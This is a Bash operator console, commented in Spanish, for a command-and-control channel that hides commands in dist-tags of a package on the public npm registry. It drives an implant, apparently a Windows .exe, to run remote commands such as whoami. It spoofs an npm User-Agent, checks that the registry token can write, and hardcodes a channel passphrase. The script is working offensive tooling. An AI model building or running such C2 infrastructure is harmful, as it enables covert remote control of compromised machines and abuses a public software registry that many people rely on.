#!/usr/bin/env bash
# Consola interactiva del C2 contra el registro PUBLICO de npm.
#
#   ./c2.sh              -> shell interactiva
#   ./c2.sh clients      -> clientes conectados y sale
#   ./c2.sh watch        -> escucha continua
#   ./c2.sh run whoami   -> un comando suelto
#
# Todo apunta a registry.npmjs.org, igual que el .exe. El token va en
# .c2token (chmod 600, fuera de git) para no fijarlo en el repo.
set -euo pipefail

cd "$(dirname "$0")"

# --- configuracion del canal (registro publico) ------------------------------
PKG="node-runtime-probe-utils"
API_BASE="https://registry.npmjs.org"
# El paquete solo tiene 0.0.0-stage; un dist-tag debe apuntar a una version
# que exista, o npm responde 400.
TAG_VALUE="0.0.0-stage"
PASS="cY40lgh0o8PuKeU0q7NT"

if [[ -f .c2token ]]; then
  TOKEN="$(< .c2token)"
else
  echo "[-] falta .c2token con el token npm (chmod 600)" >&2
  exit 1
fi

if [[ ! -x .venv/bin/python ]]; then
  echo "[-] falta el virtualenv en .venv" >&2
  exit 1
fi

# Aviso temprano: si el token no puede escribir, la shell arrancaria y cada
# comando moriria con 403 sin explicar por que.
.venv/bin/python - "$API_BASE" "$PKG" "$TOKEN" "$TAG_VALUE" <<'PY' || exit 2
import sys
import requests

base, pkg, token, version = sys.argv[1:5]
hdr = {"Authorization": f"Bearer {token}",
       "User-Agent": "npm/11.18.0 node/v22.7.0 win32 x64"}
url = f"{base}/-/package/{pkg}/dist-tags"
probe = f"{url}/preflight-probe"
try:
    r = requests.put(probe, json=version, timeout=20, headers=hdr)
except requests.RequestException as e:
    print(f"[!] no se pudo comprobar el token: {e}", file=sys.stderr)
    sys.exit(0)
if r.status_code in (200, 201, 204):
    requests.delete(probe, timeout=20, headers=hdr)
    sys.exit(0)
if r.status_code == 403:
    print(f"[!] el registro rechaza la escritura (403): {r.text.strip()[:140]}",
          file=sys.stderr)
    print("[!] el canal no podra enviar comandos. Necesitas un token que npm "
          "acepte para escritura (clasico read-write).", file=sys.stderr)
    sys.exit(2)
print(f"[!] comprobacion del token: HTTP {r.status_code} {r.text[:90]}",
      file=sys.stderr)
sys.exit(0)
PY

export NPMC2_API_BASE="$API_BASE"
export NPMC2_TAG_VALUE="$TAG_VALUE"

exec .venv/bin/python -m npm_c2 operator \
  -p "$PKG" -t "$TOKEN" --passphrase "$PASS" \
  "${@:-shell}"
